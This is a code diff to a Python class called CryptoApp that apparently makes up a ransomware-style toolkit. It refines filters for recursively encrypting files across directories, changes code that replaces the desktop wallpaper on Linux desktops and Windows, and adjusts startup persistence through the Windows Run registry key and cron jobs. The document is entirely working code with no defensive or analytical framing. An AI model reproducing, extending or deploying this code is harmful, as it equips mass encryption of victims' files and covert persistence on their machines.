@@ -7,6 +7,7 @@ import os
 import signal
 import json
 import importlib
+import re
 
 if importlib.find_loader('winreg'):
     import winreg
@@ -65,31 +66,54 @@ class CryptoApp:
 
         except: return None
 
-
     # Run a shell script
     def __runsh(self, command: str) -> None:
         call(command, shell=True)
 
+    # fn for filtering files that shouldn't be modified
+    def __omittedFilter(self, filename: str) -> bool:
+        for omit in self.omittedFiles:
+            # Match normal filenames, and ones with * (any char in between) 
+            rx: str = omit.replace('.', '\.').replace('*', '.+')
+
+            # If matches       
+            if re.search(rx, filename):
+                return False
+
+        return True
+
+    # fn for filtering extensions
+    def __extensionFilter(self, filename: str) -> bool:
+        p, ext = os.path.splitext(filename)
+
+        for mod in self.extensionsToModify:
+            # True if its directory, or proper extension
+            if os.path.isdir(filename) or filename.endswith(mod):
+                return True
+
+            if not ext:
+                # Handle .* files (eg. .vimrc, .profile)
+                rx: str = mod.replace('.', '\.').replace('*', '.+')
+                if re.search(f'^{rx}$', p):
+                    return True
+
+        return False
 
     # Handle the encrypt/decrypt actions
     def __actionHandler(self) -> None:
-
-        # Get the current directory files, and filter ones that shouldn't be modified
-        files: list = list(filter(
-            lambda x: x not in self.omittedFiles
-            , os.listdir()
-        )) 
+        
+        # Filter files that shouldn't be modified
+        files: list = list(filter(self.__omittedFilter, os.listdir())) 
 
         # Filter the file extensions
         if len(self.extensionsToModify):
-            files = list(filter(
-                lambda x: x.endswith(tuple(self.extensionsToModify)) or os.path.isdir(x)
-                , files
-            ))
+            files = list(filter(self.__extensionFilter, files))
 
 
         # Loop through each file
         for path in files:
+            path = os.path.abspath(path)
+
             try:
                 # If the "path" is directory, change the working directory
                 # Handle the files recursively, and finally return to the original directory
@@ -186,9 +210,9 @@ class CryptoApp:
         # Get the DE
         if os_info == 'linux':
             match os.environ.get("DESKTOP_SESSION"):
+                # Known: cinnamon, xfce
                 case 'ubuntu': de = 'gnome'
                 case 'kubuntu': de = 'kde'
-                case 'xfce': de = 'xfce4'
                 case _: de = os.environ.get("DESKTOP_SESSION")
 
         return [os_info, de]            
@@ -201,24 +225,24 @@ class CryptoApp:
 
         try:
             abs_path: str = os.path.abspath(file)
-
+            
             # Linux distros
             if target_os == 'linux':
-                # Xfce4 Desktop. Tested with Virtual and monitor0. Not sure about the others
-                if target_de == 'xfce4':
+                # Xfce
+                if target_de == 'xfce':
                     for monitor in ['Virtual1', 'Virtual-1', '0']:
                         self.__runsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{monitor}/workspace0/last-image -s {abs_path} 2>/dev/null')
 
-                # GNOME
-                if target_de == 'gnome':
+                # GNOME / Cinnamon
+                if target_de in ['gnome', 'cinnamon']:
                     for style in ['picture-uri', 'picture-uri-dark']:
-                        self.__run(f'gsettings set org.gnome.desktop.background {style} file://{abs_path}')
+                        self.__runsh(f'gsettings set org.gnome.desktop.background {style} file://{abs_path}')
 
             # Windows
             if target_os == 'windows':
                 ctypes.windll.user32.SystemParametersInfoW(0x14, 0, abs_path, 0)
 
-        except:
+        except Exception as e:
             print('[ERROR] Could not change the wallpaper')
 
 
@@ -229,8 +253,8 @@ class CryptoApp:
         try:
             # Linux distros
             if target_os == 'linux':
-                # Xfce4 Desktop. Tested with Virtual and monitor0.
-                if target_de == 'xfce4':
+                # Xfce
+                if target_de == 'xfce':
                     for x in ['Virtual1', 'Virtual-1', '0']:
                         result: Optional[str] = self.__getsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{x}/workspace0/last-image')
 
@@ -238,12 +262,13 @@ class CryptoApp:
                         output = result.rstrip()
                         if output: break
 
-                # GNOME. Get the dark theme
-                elif target_de == 'gnome':
-                    result: str = self.__getsh('gsettings get org.gnome.desktop.background picture-uri-dark')
+                # GNOME / Cinnamon
+                elif target_de in ['gnome', 'cinnamon']:
+                    theme:  str = 'picture-uri-dark' if target_de == 'gnome' else 'picture-uri'
+                    result: str = self.__getsh(f'gsettings get org.gnome.desktop.background {theme}')
                     
                     # Remove the "file://" and '' to get a clear url
-                    output: str = result.rstrip().replace('file://', '').replace("'", '')
+                    output = result.rstrip().replace('file://', '').replace("'", '')
 
             # Windows
             if target_os == 'windows':
@@ -262,6 +287,7 @@ class CryptoApp:
 
 
     # Launch a specified script on startup using windows registry (windows)
+    # scriptToStart should be an absolute path
     def registryStartupAction(self, target_os: str, type: str, scriptToStart: str = '') -> None:
         # Check the OS
         if target_os != 'windows':
@@ -276,11 +302,10 @@ class CryptoApp:
 
         key:        str  = r'Software\Microsoft\Windows\CurrentVersion\Run'
         key_name:   str  = 'win_reg_start'
-        abs_path:   str  = os.path.abspath(scriptToStart)
 
         # Open the RUN registry
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
-            p, ex = os.path.splitext(abs_path)
+            p, ex = os.path.splitext(scriptToStart)
 
             try:
                 if type == 'start':
@@ -289,10 +314,9 @@ class CryptoApp:
                         bat_path: str = f'{p}.bat'
 
                         # Create a batch file that executes user's script
-                        with open(bat_path, 'w') as file:
-                            file.write(f'@echo off\npython {abs_path} %*')
+                        self.writeFile(bat_path, f'@echo off\npython {scriptToStart} %*')
 
-                        abs_path = bat_path
+                        scriptToStart = bat_path
 
                     # Return if an extension is different than .bat
                     elif ex != '.bat':
@@ -300,8 +324,8 @@ class CryptoApp:
                         return
 
                     # Set the registry and run the script immediately
-                    winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, abs_path)
-                    run([abs_path])
+                    winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, scriptToStart)
+                    run([scriptToStart])
 
                 # Remove a startup script from the registry
                 elif type == 'stop':
@@ -312,6 +336,7 @@ class CryptoApp:
 
 
     # Launch a specified script on startup using cron (unix like)
+    # scriptToStart should be an absolute path
     def cronStartupAction(self, target_os: str, type: str, scriptToStart: str = '') -> None:
         # Check the OS
         if target_os not in ['linux', 'mac']:
@@ -335,8 +360,6 @@ class CryptoApp:
             if not os.path.isfile(scriptToStart):
                 print(f'[ERROR]: Script {scriptToStart} not found')
                 return
-
-            scriptToStart = os.path.abspath(scriptToStart)
 
             # Get and save the current cron settings
             current: str = self.__getsh('crontab -l')
@@ -371,8 +394,11 @@ class CryptoApp:
     def writeFile(self, path: str, val: str) -> None:
         mode = 'wb' if isinstance(val, bytes) else 'w'
 
-        with open(path, mode) as file:
-            file.write(val)
+        try:
+            with open(path, mode) as file:
+                file.write(val)
+
+        except FileNotFoundError: return
 
 
     # Read the file contents
